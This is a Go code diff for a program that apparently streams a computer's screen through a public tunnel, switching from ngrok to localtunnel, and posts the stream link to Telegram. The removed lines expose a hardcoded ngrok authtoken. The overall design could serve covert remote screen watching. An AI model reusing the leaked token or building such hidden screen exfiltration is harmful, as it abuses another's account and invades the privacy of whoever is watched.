@@ -1,7 +1,6 @@
 package main
 
 import (
-	"context"
 	_ "embed"
 	"html/template"
 	"log"
@@ -9,34 +8,34 @@ import (
 	showConsol "streamScreen/showConsol"
 	"streamScreen/stream"
 	"streamScreen/telegram"
+	"time"
+
+	"github.com/localtunnel/go-localtunnel"
 
 	"strings"
-
-	"golang.ngrok.com/ngrok"
-	"golang.ngrok.com/ngrok/config"
 )
 
 //go:embed stream_template.html
 var streamTemplate string
 
-func run(ctx context.Context) error {
-	listener, err := ngrok.Listen(ctx,
-		config.HTTPEndpoint(config.WithForwardsTo("localhost:8081")),
-		ngrok.WithAuthtoken("2a1spZ5Tu8L7gSQAJaafnsG4bJc_2h9nDWzFKoZ3Z1qu7BLLu"),
-	)
+func run() error {
+	tunnel, err := localtunnel.New(8081, "localhost", localtunnel.Options{})
 	if err != nil {
-		log.Println("Error starting ngrok:", err)
+		log.Println("Error starting localtunnel:", err)
 		return err
 	}
+	defer tunnel.Close()
 
-	appURL := listener.URL() + "/stream"
-	log.Println("App URL", appURL)
+	appURL := tunnel.URL() + "/stream"
+	log.Println("App URL:", appURL)
 
 	if err := telegram.SendTelegramMessageWithButton(appURL); err != nil {
 		log.Println("Error sending message to Telegram:", err)
 	}
-
-	return http.Serve(listener, nil)
+	for {
+		time.Sleep(time.Minute)
+	}
+	return nil
 }
 
 func main() {
@@ -68,8 +67,9 @@ func main() {
 	}()
 
 	go stream.SendVideoStream()
+	run()
 
-	if err := run(context.Background()); err != nil {
-		log.Fatal(err)
-	}
+	// if err := run(context.Background()); err != nil {
+	// 	log.Fatal(err)
+	// }
 }
